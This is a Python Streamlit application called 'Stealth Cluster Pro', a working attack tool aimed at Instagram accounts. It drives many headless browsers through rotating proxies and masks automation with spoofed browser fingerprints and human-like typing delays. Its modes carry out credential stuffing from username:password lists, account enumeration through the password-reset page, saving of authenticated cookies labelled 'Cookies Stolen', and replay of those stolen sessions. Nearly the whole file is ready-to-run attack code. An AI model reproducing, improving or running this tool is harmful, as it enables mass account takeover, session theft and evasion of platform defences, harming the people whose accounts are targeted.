import subprocess
import sys
import os
import asyncio
import random
import pandas as pd
import streamlit as st
import json
from datetime import datetime

try:
    import playwright
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])
    subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])

from playwright.async_api import async_playwright

PROFILES = [
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "locale": "en-US",
        "timezone": "America/New_York",
        "geo": {"longitude": -74.006, "latitude": 40.7128},
        "viewport": {"width": 1920, "height": 1080},
        "platform": "Win32"
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "locale": "en-GB",
        "timezone": "Europe/London",
        "geo": {"longitude": -0.1276, "latitude": 51.5074},
        "viewport": {"width": 1920, "height": 1080},
        "platform": "Win32"
    },
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "locale": "en-US",
        "timezone": "America/Los_Angeles",
        "geo": {"longitude": -118.2437, "latitude": 34.0522},
        "viewport": {"width": 1680, "height": 1050},
        "platform": "MacIntel"
    }
]

st.set_page_config(page_title="Stealth Cluster Pro", page_icon="⚡", layout="wide")
st.markdown("""
    <style>
    .main { background-color: #0e1117; color: #c9d1d9; }
    .stButton>button { width: 100%; border-radius: 4px; background-color: #238636; color: white; font-weight: bold; }
    .stProgress > div > div { background-color: #238636; }
    </style>
""", unsafe_allow_html=True)

st.title("⚡ Stealth Cluster Pro")
st.markdown("---")

with st.sidebar:
    st.header("Configuration")
    attack_mode = st.selectbox("Attack Mode", ["Login", "Recovery Exploit", "Session Theft", "Session Replay"])
    creds_input = st.text_area("Targets", height=150)
    proxy_list = st.text_area("Proxies (one per line)", value="", height=100)
    concurrency = st.slider("Concurrent browsers", 1, 8, 3)
    retries = st.number_input("Retries", min_value=1, max_value=5, value=2)

def save_session(username, cookies, profile):
    os.makedirs("sessions", exist_ok=True)
    with open(f"sessions/{username}.json", "w") as f:
        json.dump({"cookies": cookies, "profile": profile, "timestamp": datetime.now().isoformat()}, f)

def load_session(username):
    try:
        with open(f"sessions/{username}.json", "r") as f:
            return json.load(f)
    except:
        return None

col1, col2 = st.columns([3, 1])

class StealthCluster:
    def __init__(self, proxy_list, concurrency, retries, mode):
        self.proxy_list = [p.strip() for p in proxy_list.split("\n") if p.strip()]
        self.concurrency = concurrency
        self.retries = retries
        self.mode = mode
        self.semaphore = asyncio.Semaphore(concurrency)
        self.playwright = None

    async def __aenter__(self):
        self.playwright = await async_playwright().start()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        if self.playwright:
            await self.playwright.stop()

    def _get_profile(self):
        return random.choice(PROFILES).copy()

    async def _launch_browser(self, proxy_url):
        opts = {"headless": True, "args": [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-infobars",
            "--disable-dev-shm-usage",
            "--disable-gpu"
        ]}
        if proxy_url:
            opts["proxy"] = {"server": proxy_url}
        return await self.playwright.chromium.launch(**opts)

    async def _init_script(self, profile):
        return f"""
            Object.defineProperty(navigator, 'webdriver', {{get: () => undefined}});
            Object.defineProperty(navigator, 'platform', {{get: () => '{profile["platform"]}'}});
            window.navigator.chrome = {{ runtime: {{}} }};
            const origQuery = navigator.permissions.query;
            navigator.permissions.query = (p) => p.name === 'notifications' ? Promise.resolve({{state: 'denied'}}) : origQuery(p);
            const gp = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(p) {{
                if (p === 37445) return 'Intel Inc.';
                if (p === 37446) return 'Intel Iris OpenGL Engine';
                return gp.apply(this, arguments);
            }};
        """

    async def _login_attempt(self, username, password, proxy_url, attempt):
        profile = self._get_profile()
        browser = await self._launch_browser(proxy_url)
        try:
            ctx = await browser.new_context(
                user_agent=profile["ua"],
                viewport=profile["viewport"],
                locale=profile["locale"],
                timezone_id=profile["timezone"],
                geolocation=profile["geo"],
                permissions=["geolocation"]
            )
            await ctx.add_init_script(await self._init_script(profile))
            page = await ctx.new_page()
            await page.goto("https://www.instagram.com/accounts/login/", wait_until="networkidle", timeout=45000)
            await page.wait_for_selector("input[name='username']", timeout=15000)
            await page.click("input[name='username']")
            for char in username:
                await page.keyboard.type(char)
                await asyncio.sleep(random.uniform(0.05, 0.15))
            await asyncio.sleep(random.uniform(0.3, 0.8))
            await page.click("input[name='password']")
            for char in password:
                await page.keyboard.type(char)
                await asyncio.sleep(random.uniform(0.05, 0.15))
            await asyncio.sleep(random.uniform(0.4, 0.9))
            await page.click("button[type='submit']")
            await asyncio.sleep(random.uniform(5, 8))
            url = page.url
            content = await page.content()
            if "challenge" in url or "checkpoint" in content:
                return {"auth": False, "status": "MFA Required", "url": url}
            elif "login" not in url:
                cookies = await ctx.cookies()
                save_session(username, cookies, profile)
                return {"auth": True, "status": "Authenticated", "url": url}
            elif "incorrect" in content or "invalid" in content:
                return {"auth": False, "status": "Invalid credentials", "url": url}
            elif "rate" in content or "too many" in content:
                return {"auth": False, "status": "Rate limited", "url": url}
            return {"auth": False, "status": "Unknown", "url": url}
        except Exception as e:
            return {"auth": False, "status": f"Error: {str(e)}", "url": "Error"}
        finally:
            await browser.close()

    async def _recovery_attempt(self, identifier, proxy_url, attempt):
        profile = self._get_profile()
        browser = await self._launch_browser(proxy_url)
        try:
            ctx = await browser.new_context(
                user_agent=profile["ua"],
                viewport=profile["viewport"],
                locale=profile["locale"],
                timezone_id=profile["timezone"],
                geolocation=profile["geo"]
            )
            await ctx.add_init_script(await self._init_script(profile))
            page = await ctx.new_page()
            await page.goto("https://www.instagram.com/accounts/password/reset/", wait_until="networkidle", timeout=45000)
            await page.wait_for_selector("input[name='email_or_username']", timeout=15000)
            await page.fill("input[name='email_or_username']", identifier)
            await asyncio.sleep(random.uniform(0.5, 1.5))
            await page.click("button[type='submit']")
            await asyncio.sleep(random.uniform(4, 7))
            content = await page.content()
            url = page.url
            if "couldn't find" in content.lower() or "no account" in content.lower():
                return {"exists": False, "status": "Account not found", "url": url}
            elif "email sent" in content.lower() or "reset" in content.lower():
                return {"exists": True, "status": "Reset email sent", "url": url}
            elif "checkpoint" in url or "security" in content:
                return {"exists": True, "status": "Security challenge", "url": url}
            return {"exists": False, "status": "Unknown response", "url": url}
        except Exception as e:
            return {"exists": False, "status": f"Error: {str(e)}", "url": "Error"}
        finally:
            await browser.close()

    async def _replay_attempt(self, username, proxy_url, attempt):
        session = load_session(username)
        if not session:
            return {"auth": False, "status": "No session found", "url": ""}
        profile = session.get("profile", self._get_profile())
        browser = await self._launch_browser(proxy_url)
        try:
            ctx = await browser.new_context(
                user_agent=profile["ua"],
                viewport=profile["viewport"],
                locale=profile["locale"],
                timezone_id=profile["timezone"],
                geolocation=profile["geo"]
            )
            await ctx.add_init_script(await self._init_script(profile))
            await ctx.add_cookies(session["cookies"])
            page = await ctx.new_page()
            await page.goto("https://www.instagram.com/", wait_until="networkidle", timeout=45000)
            await asyncio.sleep(3)
            url = page.url
            if "login" not in url:
                return {"auth": True, "status": "Session valid", "url": url}
            return {"auth": False, "status": "Session expired", "url": url}
        except Exception as e:
            return {"auth": False, "status": f"Error: {str(e)}", "url": "Error"}
        finally:
            await browser.close()

    def parse_inputs(self, credentials):
        parsed = []
        for cred in credentials:
            cred = cred.strip()
            if not cred:
                continue
            if self.mode in ["Login", "Session Theft"]:
                if ":" in cred:
                    parsed.append(cred)
            else:
                parsed.append(cred)
        return parsed

    async def try_credential(self, idx, cred, proxy_pool):
        proxy = random.choice(proxy_pool) if proxy_pool else None
        if self.mode == "Login":
            u, p = cred.split(":", 1)
            u, p = u.strip(), p.strip()
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    r = await self._login_attempt(u, p, proxy, attempt)
                    if r["auth"]:
                        break
            return {"ID": idx, "Identifier": u, "Status": r["status"], "Authenticated": r["auth"], "URL": r["url"]}
        elif self.mode == "Recovery Exploit":
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    r = await self._recovery_attempt(cred, proxy, attempt)
                    if r["exists"]:
                        break
            return {"ID": idx, "Identifier": cred, "Status": r["status"], "Account Exists": r["exists"], "URL": r["url"]}
        elif self.mode == "Session Replay":
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    r = await self._replay_attempt(cred, proxy, attempt)
                    if r["auth"]:
                        break
            return {"ID": idx, "Username": cred, "Status": r["status"], "Session Valid": r["auth"], "URL": r["url"]}
        else:
            u, p = cred.split(":", 1)
            u, p = u.strip(), p.strip()
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    r = await self._login_attempt(u, p, proxy, attempt)
                    if r["auth"]:
                        break
            return {"ID": idx, "Username": u, "Status": r["status"], "Authenticated": r["auth"], "Cookies Stolen": r["auth"], "URL": r["url"]}

    async def run(self, credentials):
        proxy_pool = self.proxy_list if self.proxy_list else [None]
        parsed = self.parse_inputs(credentials)
        tasks = [self.try_credential(i+1, cred, proxy_pool) for i, cred in enumerate(parsed)]
        return await asyncio.gather(*tasks)

if col1.button("Deploy Cluster"):
    creds = [c.strip() for c in creds_input.split("\n") if c.strip()]
    if not creds:
        st.error("No inputs provided.")
    else:
        progress = st.progress(0)
        st.text(f"Starting {attack_mode} mode...")
        async def main():
            async with StealthCluster(proxy_list, concurrency, retries, attack_mode) as cluster:
                return await cluster.run(creds)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        raw = loop.run_until_complete(main())
        progress.progress(100)
        df = pd.DataFrame(raw)
        col1.dataframe(df, use_container_width=True)
        col1.download_button("Export CSV", df.to_csv(index=False), "results.csv", "text/csv")
        st.success("Done.")

with col2:
    st.metric("Concurrency", concurrency)
    st.metric("Retries", retries)